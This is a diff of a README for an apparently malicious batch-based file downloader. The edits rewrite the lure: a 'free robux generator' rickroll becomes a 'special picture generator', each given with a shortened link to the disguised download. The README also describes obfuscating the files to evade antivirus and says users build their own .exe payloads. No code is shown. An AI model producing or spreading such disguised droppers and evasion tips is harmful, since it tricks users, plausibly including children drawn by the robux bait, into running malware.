@@ -6,12 +6,12 @@ Direct installation of the entire code as a .zip file may fail as "virus detecte
 
 Obfuscator used made by @moom825
 Code: https://github.com/moom825/batch-obfuscator-made-in-python
-CURRENTLY, OBFUSCATOR DOESN'T OBFUSCATE FILES CORRECTLY. AS A RESULT, NOTHING CURRENTLY IS OBFUSCATED!
+Some files cannot be obfuscated, as a result, none are. This obfuscator, however, does work!
 
 Running this as default won't do much; you need to create your own .exe files!
 EXE files inside "install" were NOT MADE BY ME! These are only test files.
 
-_This is disguised as a rickroll. "Free robux generator" "disguised as rickroll" link: https://bit.ly/robuxgenrr_
+_This malicious file downloader is disguised as a "rickroll disguised as a special picture generator." https://bit.ly/picturegenn_
 
 # Detection
 _VirusTotal: https://www.virustotal.com/gui/file/e8446787043eb3257140ac5bc90c7a209bc333cbeb1138a0d339d6e765169444/detection_
